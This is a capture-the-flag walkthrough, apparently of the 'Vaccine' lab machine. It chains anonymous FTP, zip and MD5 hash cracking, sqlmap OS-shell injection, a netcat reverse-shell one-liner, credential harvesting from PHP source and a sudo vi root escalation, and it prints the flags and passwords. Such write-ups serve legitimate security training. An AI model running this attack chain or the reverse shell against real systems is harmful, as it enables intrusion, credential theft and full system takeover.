![Vaccine.jpg](/assets/Tier-2/Vaccine/vaccine.jpg)

1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.129.36.42
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.129.36.42
```


**Output**
```bash
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```


3. Connect for **ftp** with username **anonymous**
```bash
┌──(root㉿est)-[/home/kali]
└─| ftp 10.129.36.42
220 (vsFTPd 3.0.3)
Name (10.129.36.42:kali): anonymous
```

4. Get **backups.zip**
```bash
ftp> ls
229 Entering Extended Passive Mode (|||10516|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
```

5. Use **zip2john** to obtain hash to crack
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| zip2john backup.zip > hash.txt
```

6. Crack the password with **john** and use **rockyou.txt** dictionary
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| john --wordlist=./../rockyou.txt hash.txt 
```

7. Show the password to decrypt **backups.zip**
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| john --show hash.txt
```

**Output**
```bash
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
```

* Password is **741852963**


8. Unzip **backups.zip** and look the files.
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| unzip backup.zip 
```

```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| ls 
```

**Output**
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| ls
backup.zip  hash.txt  index.php  style.css
```

9. Cat **index.php**
```bash
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>MegaCorp Login</title>
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="./style.css">

</head>
  <h1 align=center>MegaCorp Login</h1>
<body>
<!-- partial:index.partial.html -->
<body class="align">

  <div class="grid">

    <form action="" method="POST" class="form login">

      <div class="form__field">
        <label for="login__username"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#user"></use></svg><span class="hidden">Username</span></label>
        <input id="login__username" type="text" name="username" class="form__input" placeholder="Username" required>
      </div>

      <div class="form__field">
        <label for="login__password"><svg class="icon"><use xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="#lock"></use></svg><span class="hidden">Password</span></label>
        <input id="login__password" type="password" name="password" class="form__input" placeholder="Password" required>
      </div>

      <div class="form__field">
        <input type="submit" value="Sign In">
      </div>

    </form>


  </div>

  <svg xmlns="http://www.w3.org/2000/svg" class="icons"><symbol id="arrow-right" viewBox="0 0 1792 1792"><path d="M1600 960q0 54-37 91l-651 651q-39 37-91 37-51 0-90-37l-75-75q-38-38-38-91t38-91l293-293H245q-52 0-84.5-37.5T128 1024V896q0-53 32.5-90.5T245 768h704L656 474q-38-36-38-90t38-90l75-75q38-38 90-38 53 0 91 38l651 651q37 35 37 90z"/></symbol><symbol id="lock" viewBox="0 0 1792 1792"><path d="M640 768h512V576q0-106-75-181t-181-75-181 75-75 181v192zm832 96v576q0 40-28 68t-68 28H416q-40 0-68-28t-28-68V864q0-40 28-68t68-28h32V576q0-184 132-316t316-132 316 132 132 316v192h32q40 0 68 28t28 68z"/></symbol><symbol id="user" viewBox="0 0 1792 1792"><path d="M1600 1405q0 120-73 189.5t-194 69.5H459q-121 0-194-69.5T192 1405q0-53 3.5-103.5t14-109T236 1084t43-97.5 62-81 85.5-53.5T538 832q9 0 42 21.5t74.5 48 108 48T896 971t133.5-21.5 108-48 74.5-48 42-21.5q61 0 111.5 20t85.5 53.5 62 81 43 97.5 26.5 108.5 14 109 3.5 103.5zm-320-893q0 159-112.5 271.5T896 896 624.5 783.5 512 512t112.5-271.5T896 128t271.5 112.5T1280 512z"/></symbol></svg>

</body>
<!-- partial -->
  
</body>
</html>
```

#### Of all file we go to use:
```bash
if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")
```

10. Crack **2cb42f8734ea607eefed3b70af13bbd3** use MD5, use https://crackstation.net/
![vaccine-md5.PNG](/assets/Tier-2/Vaccine/vaccine-md5.PNG)

* The password to login are: username **admin** and password **qwerty789**


11. Login with credentials

![vaccine-web.PNG](/assets/Tier-2/Vaccine/vaccine-web.PNG)


12. Use **BurpSuite** to capture a petition searching any thing.
![vaccine-search.PNG](/assets/Tier-2/Vaccine/vaccine-search.PNG)
![vaccine-petition.PNG](/assets/Tier-2/Vaccine/vaccine-petition.PNG)

13. Put the output of petition on **r.req** file
14. Use **sqlmap** to find vulnerabilities
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| sqlmap -r r.req  
```
> Here know the database service **Postgres**
---
Get a shell
```bash
┌──(root㉿est)-[/home/kali/Desktop/Vaccine]
└─| sqlmap -r r.req --os-shell
```

15. Listen on port 4444 and use **https://www.revshells.com/** to get a reverse shell
```bash
os-shell> rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.250 4444 >/tmp/f
```

16. With new shell spawn a **/bin/bash**
```bash
$ python3 -c "import pty; pty.spawn('/bin/bash')"
```

17. cat and grep for search any password in path `/var/www/html` on file `cat dashboard.php`
```bash
postgres@vaccine:/var/www/html$ cat dashboard.php | grep -i 'pass'
```


**Output**
```bash
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

18. With password **P@s5w0rd!** login to ssh
```bash
┌──(kali㉿est)-[~]
└─$ ssh postgres@10.129.36.42
```


19. Get a **User flag**
```bash
postgres@vaccine:~$ ls
11  user.txt
postgres@vaccine:~$ cat user.txt 
ec9b13ca4d6229cd5cc1e09980965bf7
```

20. List posibles binaries to exploit
```bash
postgres@vaccine:~$ sudo -l
```

**Output**
```bash
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

21. Use https://gtfobins.github.io/ to search exploit with **vi**
![vaccine-vi.PNG](/assets/Tier-2/Vaccine/vaccine-vi.PNG)


22. Edit file **/bin/vi /etc/postgresql/11/main/pg_hba.conf**
```bash
postgres@vaccine:~/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

23. Spawn a **terminal with root** and cat a flag

```bash
# cd root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt  
dd6e058e814260bc70e9bbdef2715849
```